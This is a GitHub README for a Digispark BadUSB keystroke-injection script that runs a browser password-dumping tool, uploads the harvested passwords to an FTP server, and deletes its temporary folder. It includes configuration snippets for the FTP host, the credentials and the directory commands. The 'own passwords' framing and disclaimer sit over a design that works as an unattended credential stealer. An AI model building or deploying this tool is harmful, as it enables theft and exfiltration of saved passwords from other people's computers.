# Digispark-PasswordRetriever
<br/>
<p align="center">
  <a href="https://github.com/dehmitros/Digispark-PasswordRetriever">
    <img src="https://i.imgur.com/qkDFmPA.png" alt="Logo" width="80" height="80">
  </a>

  <h3 align="center">Digispark Password Retriever</h3>

  <p align="center">
    Back-up all your passwords in a few minutes!
    <br/>
    <br/>
    <a href="https://github.com/dehmitros/Digispark-PasswordRetriever/issues">Report Bugs</a>
  </p>

![Downloads](https://img.shields.io/github/downloads/dehmitros/Digispark-PasswordRetriever/total) 
</p>

## Table Of Contents
* [Warning](#warning)
* [About the Project](#about-the-project)
* [Getting Started](#getting-started)
  * [Prerequisites](#prerequisites)
* [Usage](#usage)
* [License](#license)
* [Author](#authors)

## Warning

This script was created for backing-up YOUR OWN passwords and to be used strictly for computers YOU own! It is not supposed to be a hack or to be used as one. I am in NO WAY responsible for anything illegal that happens through the use of this script.

## About The Project

Every password you've ever saved in your browser gets chached. While this does raise some security concerns, it means backing-up and moving passwords from one computer to another is relatively easy. What this script does is it uses NirSoft's very well-known password retrieving tool (WebBrowserPassView), and automatically upload it to a specified FTP server using a dirt-cheap arduino-compatible board called DigiSpark.

## Getting Started

Firstly you need to download the script and open it in your Arduino IDE.
Either click on the green "Code" button > Download as zip
or
Select the script you want to use and copy-paste it to your Arduino IDE.

### Prerequisites

After you've opened the script, you will need to modify a few things.

Firstly, you need to specify what FTP server you're using (default is ftp.drivehq.com since it offers a free account).

Go to 
```sh
DigiKeyboard.print("open ftp.drivehq.com");
```
and change it according to your needs.

You will then need to type your username/password for the FTP server 2 times each
Firstly in 
```sh
//get file through FTP
```
and secondly in
```sh
//send file through FTP
```

Both look like this
```sh
DigiKeyboard.print("username");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1200);
DigiKeyboard.print("password");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
```

Additionally you can also change the directory the script makes + it's location by modifying the lines
```sh
DigiKeyboard.print("mkdir C:\\t3mp0r4ry");
DigiKeyboard.print("rmdir C:\\t3mp0r4ry /s");
DigiKeyboard.print("cd C:\\t3mp0r4ry");
 ``` 
(The last one appears 2 times)

Lastly you can modify the delays depending on the speeds of your computer, they look like this
```sh
DigiKeyboard.delay("enter number in milliseconds");
 ``` 


## Usage

Just upload the modified script to your DigiSpark and you're good to go!

## License

Distributed under the ODC Open Database License (ODbL). See [LICENSE](https://github.com/dehmitros/Digispark-PasswordRetriever/blob/master/LICENSE.md) for more information.

## Authors

* [DehMitros](https://github.com/dehmitros/)